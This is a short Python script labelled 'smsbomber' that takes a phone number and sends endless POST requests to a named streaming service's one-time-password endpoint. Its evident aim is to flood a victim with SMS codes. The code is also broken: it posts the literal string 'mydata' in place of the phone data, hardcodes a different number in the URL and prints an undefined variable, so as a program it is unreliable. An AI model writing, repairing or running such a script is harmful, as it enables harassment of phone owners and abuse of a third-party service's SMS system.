# smsbomber-
import requests
import os
phone= input("how to nember:+98:")
urlsend="https://api-v2.filmnet.ir/access-token/users/09390418932/otp"
mydata= {"cellphone":"+98"+phone}
print(mydata)
while True:
	requests.post(urlsend,data="mydata")
print(send)
